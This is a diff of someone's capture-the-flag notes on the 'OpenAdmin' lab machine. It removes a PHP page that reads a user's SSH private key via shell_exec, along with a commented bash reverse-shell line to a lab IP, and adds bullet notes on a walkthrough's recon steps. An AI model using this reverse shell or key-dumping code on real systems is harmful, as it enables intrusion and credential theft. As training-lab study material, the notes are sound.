@@ -104,17 +104,11 @@ But I'm not able to use the passphrase yettt which is frustrating and a reverse 
 
 
 ## Writeups   
-  
-<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
-# Open Admin Trusted
-# OpenAdmin
-#exec("bash -i >& /dev/tcp/10.10.14.74/1234 0>&1");
-$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
-echo "<pre>$output</pre>";
-?>
-<html>
-<h3>Don't forget your "ninja" password</h3>
-Click here to logout <a href="logout.php" tite = "Logout">Session
-</html>
+
+### ippsec  
+
+* So first he tried to look for a "robot.txt" file because it could lead to something if it existed.
+* He tried to check if the backend was php by trying "index.php" if "index.html" existed.
+* Looked at the source code of the websites he found to see if he can find the software that is used to make the website.
 
 <!-- tagsss -->
